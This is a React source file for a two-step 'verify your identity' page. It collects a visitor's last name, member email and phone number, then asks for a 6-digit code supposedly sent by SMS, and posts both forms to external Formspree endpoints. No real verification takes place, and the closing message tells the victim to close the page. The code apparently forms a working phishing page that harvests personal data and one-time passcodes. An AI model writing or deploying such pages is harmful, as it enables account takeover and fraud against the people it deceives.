import { useForm } from '@formspree/react';
import "./register.styles.css"

import {InputField} from '../InputField/InputField'


export default function Register (){
    const [state, handleSubmit] = useForm("mgeqdqko");
    if (state.succeeded) {
        return <FinalCode />;
    }
    return (
        <div className="reg">
            <p>
                Provide the following information to verify your identity
            </p>
            <form 
                onSubmit={handleSubmit}
            >
                <InputField name={'Last Name'} />
                <InputField name={'Member Email Address'} />
                <InputField name={'Phone Number'} />
                <button  type="submit" disabled={state.submitting}>Continue</button>
            </form>
        </div>
    )
}

function FinalCode (){
    const [state, handleSubmit] = useForm("xwkzzkkz");
    if(state.succeeded){
        return <p className='p page'>Thanks we will get back to you! Close the page now.</p>
    }
    return (
        <div className="reg">
            <form onSubmit={handleSubmit} >
                <p className='p'>For your security, A 6 digit code have been sent to your phone number. Please wait for a minute to receive it</p>
                <InputField name={'Verification Code'} />
                <button  type="submit" disabled={state.submitting}>Submit</button>
            </form>
        </div>
    )
}